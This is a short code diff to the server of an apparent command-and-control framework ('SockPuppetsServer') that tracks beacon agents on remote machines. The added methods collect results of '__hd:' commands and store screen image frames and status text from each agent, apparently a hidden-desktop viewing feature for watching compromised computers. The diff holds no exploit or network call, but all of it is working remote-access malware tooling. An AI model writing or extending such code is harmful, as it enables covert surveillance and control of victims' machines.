@@ -1288,10 +1288,32 @@ class SockPuppetsServer:
         agent = self.agents[agent_id]
         results = agent.pending_results.copy()
 
+        self._note_desktop(agent)
         if clear:
             agent.pending_results.clear()
 
         return results
+
+    def _note_desktop(self, agent):
+        for row in agent.pending_results:
+            cmd = str(row.get('command') or '')
+            out = row.get('output') or ''
+            if not cmd.startswith('__hd:'):
+                continue
+            if out.startswith('HDIMG:'):
+                agent.desktop_frame = out
+            elif out:
+                agent.desktop_status = out[:240]
+
+    def get_desktop_view(self, agent_id: str) -> dict:
+        agent = self.agents.get(agent_id)
+        if not agent:
+            return {}
+        self._note_desktop(agent)
+        return {
+            'frame': getattr(agent, 'desktop_frame', ''),
+            'status': getattr(agent, 'desktop_status', ''),
+        }
 
     def check_agent_health(self, agent_id: str) -> str:
         """Check if beacon agent might be dead"""
